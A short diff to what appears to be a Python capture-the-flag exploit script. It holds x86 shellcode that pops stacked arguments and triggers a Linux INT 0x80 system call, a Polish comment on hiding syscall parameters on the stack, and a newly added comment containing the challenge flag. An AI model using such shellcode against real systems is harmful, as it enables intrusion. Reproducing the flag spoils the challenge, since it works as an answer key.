@@ -2,6 +2,7 @@
 
 SHELLCODE = "\x5e\x59\x59\x58\x56\x51\x89\xe3\x89\xf9\x89\xfa\xcd\x80"
 # Jezeli jest malo miejsca na ukrycie parametrow wywolania INT 80 mozna je zapisac na stosie a pozniej zrzucac za pomoca popow
+# FLAG: sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps
 
 def convert_to_int_le(string):
     return str(int(string[::-1].encode('hex'), 16))
